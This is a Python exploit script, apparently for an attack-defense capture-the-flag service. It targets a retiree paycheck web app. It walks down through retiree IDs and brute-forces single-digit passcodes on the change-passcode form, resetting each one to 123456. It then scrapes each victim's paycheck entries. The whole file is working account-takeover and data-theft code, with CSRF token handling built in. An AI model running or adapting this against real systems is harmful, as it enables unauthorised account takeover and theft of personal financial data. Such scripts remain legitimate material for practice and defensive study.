#!/usr/bin/env python3

import requests
import sys
from bs4 import BeautifulSoup


def request_ded(address, ded_id, passcode):
    url = f"http://{address}/show-paychecks"
    client = requests.session()
    form_soup = BeautifulSoup(client.get(url).content, "html.parser")
    csrf_token = form_soup.find("input", {"name": "csrf_token"})["value"]
    ret_soup = BeautifulSoup(client.post(url, data={"csrf_token": csrf_token, "retiree_id": ded_id, "passcode": passcode}).content, "html.parser")
    pre = ret_soup.find("pre")
    if pre is None:
        return None
    ret = []
    for line in pre.contents[0].split("\n")[4:]:
        parts = line.strip().split(" ")
        if len(parts) < 5:
            break
        ret.append(parts[5])
    return ret


def change_passcode(address, ded_id, current_passcode, new_passcode):
    url = f"http://{address}/change-passcode"
    client = requests.session()
    form_soup = BeautifulSoup(client.get(url).content, "html.parser")
    csrf_token = form_soup.find("input", {"name": "csrf_token"})["value"]
    ret_soup = BeautifulSoup(client.post(url, data={
        "csrf_token": csrf_token,
        "retiree_id": ded_id,
        "passcode": current_passcode,
        "new_passcode": new_passcode
    }).content, "html.parser")
    return ret_soup.find("pre") is not None


def brute_passcode(address, retiree_id, new_passcode):
    for i in range(0, 10):
        if change_passcode(address, retiree_id, i, new_passcode):
            return True
    return False


def main():
    address = sys.argv[1]
    for i in range(9999999998, 0, -1):
        if brute_passcode(address, i, 123456):
            print(request_ded(address, i, 123456), flush=True)
        else:
            break


if __name__ == "__main__":
    main()
